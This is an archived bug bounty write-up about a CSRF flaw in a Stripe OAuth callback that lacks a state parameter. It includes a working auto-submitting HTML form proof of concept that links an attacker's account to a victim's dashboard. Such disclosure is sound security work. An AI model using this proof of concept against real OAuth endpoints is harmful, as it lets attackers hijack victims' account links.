# CSRF in OAuth flow of a private program.

- **Source URL:** https://medium.com/@oXnoOneXo/csrf-in-oauth-flow-of-a-private-program-46db275eed33?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20231012173332/https://medium.com/@oXnoOneXo/csrf-in-oauth-flow-of-a-private-program-46db275eed33?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3575 (id 3575)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
**Hello friend, This writeup is about a simple CSRF in a function that’s using OAuth to attach third-party accounts to the user’s dashboard.**

The attack arises due to the lack of using Anti-CSRF mechanism like *State* parameters on the endpoint (/stripe-oauth-callback?redirect=&scope=&code=) which enables the attackers to inject his OAuth-Code in a FORM with a GET request and just by visiting any user the attacker’s page the attacker’s account will be linked.

The function i was testing used for linking *stripe* account to the user’s dashboard by using the *Data Source* feature and choose *stripe* option:

I clicked on *Continue to Stripe* with intercepting each request after choosing the Stripe account i want to link and i ended up with the request to (https://subdomain.target.com/stripe-oauth-callback?redirect=/app/dashboard&scope=&code=read only&code=ac\_xxxxxxxx), I noticed it doesn’t have *state* parameter so i just used Burp’s engagement tools to create the POC, The poc was like:

```
<html>
  <body>
    <form action="https://subdomain.target.com/api/stripe-oauth-callback">
      <input type="hidden" name="redirect_path" value="/settings/data-sources" />
      <input type="hidden" name="scope" value="read_only" />
      <input type="hidden" name="code" value="#code_value" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
I used python3 to launch a simple HTTP server:

`python3 -m http.server 8000`
I opened my second account from different browser and visited the HTML page and got redirected to the application with a message that the *stripe* account is linked, I reported the issue and got rewarded:

You can find more about OAuth issues in:

Thanks for reading and i hope if it was kind of helpful. You can find me in:
